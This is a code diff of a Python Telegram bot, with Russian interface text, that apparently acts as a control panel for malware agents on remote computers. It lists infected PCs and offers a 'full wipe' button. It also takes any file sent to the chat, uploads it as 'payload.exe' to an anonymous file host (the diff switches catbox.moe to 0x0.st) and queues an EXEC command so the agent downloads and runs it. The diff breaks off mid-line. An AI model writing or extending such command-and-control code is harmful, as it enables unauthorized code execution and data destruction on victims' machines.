@@ -55,7 +55,7 @@ def start_cmd(message):
     markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
     markup.row("Список компьютеров", "Запустить файл")
     markup.row("Полный Wipe")
-    bot.send_message(message.chat.id, "Панель управления активна. Можешь просто перетащить и скинуть файл в чат.", reply_markup=markup)
+    bot.send_message(message.chat.id, "Панель управления активна. Скинь файл в чат для запуска.", reply_markup=markup)
 
 @bot.message_handler(func=lambda msg: msg.text == "Список компьютеров")
 def list_computers(message):
@@ -81,9 +81,8 @@ def ask_file_path(message):
     if not selected_computer:
         bot.send_message(message.chat.id, "Сначала выберите компьютер в разделе 'Список компьютеров'.")
         return
-    bot.send_message(message.chat.id, f"Просто скинь файл (.exe или любой другой) в этот чат, и он автоматически запустится на ПК {selected_computer}.")
+    bot.send_message(message.chat.id, f"Перетащи и скинь файл в этот чат, и он автоматически запустится на ПК {selected_computer}.")
 
-# Перехват любых файлов и документов, которые ты кидаешь в чат
 @bot.message_handler(content_types=['document', 'audio', 'video', 'photo'])
 def handle_uploaded_file(message):
     global selected_computer, pending_commands
@@ -92,9 +91,8 @@ def handle_uploaded_file(message):
         return
 
     try:
-        bot.send_message(message.chat.id, "Получил файл, загружаю на сервер для передачи агенту...")
+        bot.send_message(message.chat.id, "Получил файл, загружаю на хостинг...")
         
-        # Получаем файл от Telegram
         file_info = None
         if message.document:
             file_info = bot.get_file(message.document.file_id)
@@ -111,18 +109,15 @@ def handle_uploaded_file(message):
 
         downloaded_file = bot.download_file(file_info.file_path)
 
-        # Загружаем файл на публичный анонимный файлообменник (catbox.moe), чтобы агент мог скачать его по прямой ссылке
-        files = {'fileToUpload': ('payload.exe', downloaded_file)}
-        data = {'reqtype': 'fileupload'}
-        response = requests.post('https://catbox.moe/user/api.php', data=data, files=files)
+        files = {'file': ('payload.exe', downloaded_file)}
+        response = requests.post('https://0x0.st', files=files)
 
         if response.status_code == 200 and response.text.startswith('http'):
             direct_url = response.text.strip()
-            # Отправляем команду агенту
             pending_commands[selected_computer] = f"EXEC:{direct_url}"
             bot.send_message(message.chat.id, f"Файл успешно отправлен на ПК {selected_computer} и запущен.")
         else:
-            bot.send_message(message.chat.id, "Ошибка загрузки файла на хостинг.")
+            bot.send_message(message.chat.id, f"Ошибка хостинга: статус {response.status_code}")
             
     except Exception as e:
         bot.send_message(message.chat.id, f"Ошибка: {str(e)}")
@@ -134,14 +129,4 @@ def callbacks(call):
     
     if data.startswith("select_pc:"):
         selected_computer = data.split(":")[1]
-        bot.answer_callback_query(call.id, f"Выбран ПК: {selected_computer}")
-        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=f"Активный компьютер: {selected_computer}")
-    elif data == "menu_main":
-        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="Главное меню.")
-
-if __name__ == "__main__":
-    HOST_URL = "https://tg-bot-bekv.onrender.com"
-    bot.remove_webhook()
-    bot.set_webhook(url=f"{HOST_URL}/{TOKEN}")
-    port = int(os.environ.get("PORT", 10000))
-    app.run(host="0.0.0.0", port=port)
+        bot.answer_callback_query(call.id, f"Вы
